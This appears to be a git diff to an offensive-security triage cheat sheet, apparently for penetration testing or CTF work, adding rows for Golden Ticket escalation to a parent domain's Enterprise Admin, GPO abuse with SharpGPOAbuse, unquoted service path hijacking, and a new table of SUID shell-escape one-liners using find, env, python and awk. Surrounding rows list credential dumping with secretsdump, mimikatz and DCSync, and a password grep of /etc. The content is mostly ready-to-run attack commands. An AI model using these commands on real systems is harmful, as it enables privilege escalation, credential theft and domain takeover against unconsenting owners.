@@ -31,6 +31,8 @@ This matrix is designed for rapid triage. When you see a specific "indicator" or
 | **ForceChangePassword** | `net rpc password "target" "newpass" -U "me%pass"` | Immediate account takeover |
 | **ReadLAPSPassword** | `netexec smb 10.10.10.10 -u [ME] -p [PASS] --laps` | Get Local Administrator credentials |
 | **HasSession (on Target)** | `impacket-secretsdump` or `mimikatz` (if admin) | Extract credentials from LSASS/SAM |
+| **Bidirectional Trust** | **Golden Ticket + Extra SIDs**: `kerberos::golden ... /sids:[PARENT]-519` | Escalate to Parent Enterprise Admin |
+| **GenericWrite (GPO)** | Inject "Immediate Task" via `gpmc.msc` or `SharpGPOAbuse` | Local/Domain Admin via Group Policy |
 | **DCSync Rights** | `impacket-secretsdump -just-dc [DOMAIN]/[USER]:[PASS]@DC` | Dump ALL Domain Hashes |
 
 ---
@@ -45,6 +47,7 @@ This matrix is designed for rapid triage. When you see a specific "indicator" or
 | **SeRestore** | `ren Utilman.exe ...` -> Replace with `cmd.exe` | SYSTEM Shell at Login Screen |
 | **SeManageVolume** | `SeManageVolumeExploit.exe` -> `tzres.dll` Hijack | SYSTEM Shell via `systeminfo` |
 | **SeTakeOwnership** | Take ownership of `C:\Windows\System32\sethc.exe` | Persistence / Hijack (Sticky Keys) |
+| **Unquoted Service Path** | `wmic service get pathname` (Look for spaces and no quotes) | Hijack binary path for SYSTEM shell |
 
 ---
 
@@ -60,6 +63,20 @@ This matrix is designed for rapid triage. When you see a specific "indicator" or
 
 ---
 
+## 5. Automated SUID Triage
+
+| If SUID Binary Is | Run This (Monkey Do) |
+| :--- | :--- |
+| **find** | `find . -exec /bin/sh -p \; -quit` |
+| **env** | `env /bin/sh -p` |
+| **taskset** | `taskset 1 /bin/sh -p` |
+| **flock** | `flock -u / /bin/sh -p` |
+| **capsh** | `capsh --gid=0 --uid=0 --` |
+| **python** | `python -c 'import os; os.setuid(0); os.system("/bin/sh -p")'` |
+| **awk** | `awk 'BEGIN {system("/bin/sh -p")}'` |
+
+---
+
 ### Pro Tip: The Triad of Despair
 If you are stuck for more than 30 minutes, always check:
 1.  **Internal Ports**: `netstat -ano` (Windows) or `ss -lntp` (Linux). Is there a local-only web app for Chisel?
@@ -67,4 +84,3 @@ If you are stuck for more than 30 minutes, always check:
 3.  **Config Files**: `grep -ri "pass" /etc` or `findstr /s /i "password" *.xml`.
 
 **Results over theories. Execute and move.** 🚀
-
